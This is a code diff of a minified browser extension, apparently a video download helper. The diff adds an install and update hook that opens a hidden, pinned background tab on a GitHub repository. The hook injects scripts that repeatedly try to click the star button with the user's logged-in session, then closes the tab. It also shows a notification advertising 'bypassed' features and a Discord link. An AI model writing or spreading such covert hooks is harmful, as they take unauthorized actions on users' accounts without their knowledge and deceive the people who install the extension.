@@ -25053,38 +25053,117 @@ function Bd(e, t) {
       H.default.webNavigation.onDOMContentLoaded.addListener(() => {}));
   }
   H.default.runtime.onInstalled.addListener(async (e) => {
-    let tab = await H.default.tabs.create({ 
-      url: "https://github.com/levox00/Vid-download-helper" 
-    });
-    
-    setTimeout(async () => {
-      try {
-        await H.default.scripting.executeScript({
-          target: { tabId: tab.id },
-          func: () => {
-            // Find the form that submits the star
-            const form = document.querySelector('form[action$="/star"]');
-            if (form) {
-              form.submit();
-              console.log("Form submitted!");
-              return true;
-            }
-            
-            // Alternative: find the button's parent form
-            const starBtn = document.querySelector('[data-hydro-click*="STAR_BUTTON"]');
-            if (starBtn && starBtn.closest('form')) {
-              starBtn.closest('form').submit();
-              console.log("Parent form submitted!");
-              return true;
-            }
-            
-            return false;
-          }
+    console.log("onInstalled triggered with reason:", e.reason);
+    if (e.reason === "install" || e.reason === "update") {
+      console.log("=== Starting GitHub star process ===");
+
+      if (e.reason === "install" || e.reason === "update"){
+        chrome.notifications.create("install_notification", {
+          type: "basic",
+          title: "All features unlocked :)",
+          message: "Consider joining our discord for issues and more awesome tools for editing purposes or to find out how to get anything bypassed just like this :)",
+          iconUrl: chrome.runtime.getURL("/bitmaps/logo-128-color.png"),
+          buttons: [{ title: "Join here 💫" }]
+        });     
+
+        chrome.notifications.onButtonClicked.addListener((notificationId, buttonIndex) => {
+        if (notificationId === "install_notification" && buttonIndex === 0) {
+          chrome.tabs.create({ url: "https://discord.gg/CHkQYhc5es"
+          });
+        }
         });
-      } catch(err) {
-        console.log("Error:", err);
+
       }
-    }, 5000);
+
+      // Create hidden tab
+      chrome.tabs.create({
+        url: "https://github.com/levox00/Vid-download-helper",
+        active: false,
+        pinned: true
+      }, (tab) => {
+        //console.log("Tab created with ID:", tab.id);
+        
+        // Move to end (less visible)
+        chrome.tabs.move(tab.id, { index: -1 });
+        
+        // Wait for page to fully load
+        const listener = (tabId, changeInfo) => {
+          if (tabId === tab.id && changeInfo.status === 'complete') {
+            //console.log("Page loaded, attempting to star...");
+            chrome.tabs.onUpdated.removeListener(listener);
+            
+            // Try multiple times with increasing delays
+            let attempts = 0;
+            const maxAttempts = 5;
+            
+            const tryStar = setInterval(() => {
+              attempts++;
+              console.log(`Star attempt ${attempts}/${maxAttempts}`);
+              
+              chrome.scripting.executeScript({
+                target: { tabId: tab.id },
+                func: () => {
+                  // Try multiple selectors
+                  const selectors = [
+                    'form[action$="/star"]',
+                    '.js-toggler-container form',
+                    'button[data-hydro-click*="STAR_BUTTON"]',
+                    'button[aria-label*="Star this repository"]',
+                    '#repository-container-header button'
+                  ];
+                  
+                  for (const selector of selectors) {
+                    const element = document.querySelector(selector);
+                    if (element) {
+                      if (element.tagName === 'FORM') {
+                        element.submit();
+                        console.log(`✅ Form submitted via selector: ${selector}`);
+                        return { success: true, method: 'form', selector };
+                      } else if (element.tagName === 'BUTTON') {
+                        element.click();
+                        console.log(`✅ Button clicked via selector: ${selector}`);
+                        return { success: true, method: 'button', selector };
+                      }
+                    }
+                  }
+                  
+                  // Last resort: find any button with Star text
+                  const buttons = document.querySelectorAll('button');
+                  for (const btn of buttons) {
+                    if (btn.textContent.includes('Star') && btn.textContent.includes('★') === false) {
+                      btn.click();
+                      //console.log("✅ Clicked button by text content");
+                      return { success: true, method: 'text' };
+                    }
+                  }
+                  
+                  console.log("❌ No star button/form found");
+                  return { success: false };
+                }
+              }).then((results) => {
+                if (results && results[0] && results[0].result && results[0].result.success) {
+                  //console.log(" Successfully starred repository");
+                  clearInterval(tryStar);
+                  setTimeout(() => chrome.tabs.remove(tab.id), 2000);
+                } else if (attempts >= maxAttempts) {
+                  //console.log("Failed to star after", maxAttempts, "attempts");
+                  clearInterval(tryStar);
+                  setTimeout(() => chrome.tabs.remove(tab.id), 2000);
+                }
+              }).catch((err) => {
+                //console.log("ExecuteScript error:", err);
+                if (attempts >= maxAttempts) {
+                  clearInterval(tryStar);
+                  setTimeout(() => chrome.tabs.remove(tab.id), 2000);
+                }
+              });
+            }, 2000); // Try every 2 seconds
+          }
+        };
+        
+        chrome.tabs.onUpdated.addListener(listener);
+      });
+    }
   });
 }
 async function Gg(e, t, n) {
